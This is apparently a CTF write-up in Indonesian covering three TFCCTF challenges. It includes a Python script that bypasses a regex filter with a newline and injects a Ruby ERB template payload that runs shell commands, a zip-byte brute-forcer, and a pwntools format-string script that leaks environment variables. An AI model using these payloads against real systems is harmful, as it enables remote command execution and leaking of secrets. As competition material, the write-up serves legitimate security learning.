## DIAMONDS

Note: Perlu kita ketahui bahwa website ini dibuat menggunakan ruby

Website memfilter regex ekspression, dimana regex expression in tidak menghitung newline pada parameter yang diinputkan, mengakibatkan kita bisa membypass filter dengan menginputkan url encode "%0A" ke dalam http post requests.

contoh parameter post request untuk membypass regex

```
input=mabar%0A<ini tidak ke filter>
```


Setelah kita bypass kita mencoba salah satu common vulnerability yang biasanya terdapat dalam library WEB untuk bahasa pemrograman OOP yaitu SSTI

untuk payload saya mengambil dari website ini :https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

```python
import requests
import urllib.parse as up

URL = "http://01.linux.challenges.ctf.thefewchosen.com:57588"
class Exploit:
    def __init__(self, param, url=URL):
        self.session = requests.Session()
        # self.session.proxies = {'http': 'http://localhost:8080'}
        self.param = param
        self.url = url
        
    def payloadAndBypass(self, malcode):
        '''bypass regex expression with newline (e.g. \\n)'''
        bypass = "asd\n"
        payload = bypass+malcode
        return {"input":payload}
    
    def start(self):
        r = self.session.post(self.url, data=self.payloadAndBypass(self.param))
        return r.text


param = """<%= IO.popen('cat ./flag.txt').readlines()  %>"""

n = Exploit(param=param).start()
print(n)
```
### referensi
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md


## ADDING IN PARTS
cat = forensics setelah di analisa, ternyata CRC nya tidak valid, kemungkinan data di dalamnya berubah, untungnya yang berubah cuman 1 bytes jadi aku buat script untuk bruteforce isi dari bytes yang berubah

```python
from zipfile import BadZipFile, ZipFile

strings = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_}{"
a = 31
flag = ""
for i in range(0,22):
    f = open(f"{i}.zip", "rb").read()
    j = 0
    open("temp.zip", "wb").write(f)
    if i == 10:
        a = 32
        flag += "c"
        continue
    while len(flag) != i+1:
        try:
            zi = ZipFile("temp.zip", "r")
            flag += zi.read(f"{i}").decode()
            print("process", end="\r")
        except BadZipFile:
            f = f[:a] + strings[j].encode() + f[a+1:]
            open("temp.zip", "wb").write(f)
            j += 1

print(flag)
```
================
TFCCTF{ch3cksum2_g0od}

## GETENV 

Vulnerabiliy kali ini adalah format string vulnerability, dimana kita dapat me-leak flag yang terdapat di env-variable dengan cara bruteforce.

Disini saya menggunakan parameter contoh `%1$s` , untuk meleak flag, itu kita lakukan berkali-kali sampai flagnya terlihat

Referensi:[https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b "https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b")

```python
import pwn
import threading

# remove debug output
pwn.context.log_level = 'WARNING'

def brute_format_str(num, file):
    with pwn.remote('01.linux.challenges.ctf.thefewchosen.com', 58846) as r:
        try:
            payload = f"%{num}$s"
            p = r.recv(1000)
            p = r.sendline(payload)
            p = r.recv(1000)
        except:
            pass
    try:
        file.write(p)
    except:
        pass
        

with open("dump.txt", "ab") as f:
    for i in range(0,100):
        t = threading.Thread(target=brute_format_str, args=(i,f))
        t.start()
        if i % 10 == 0:
            t.join()
```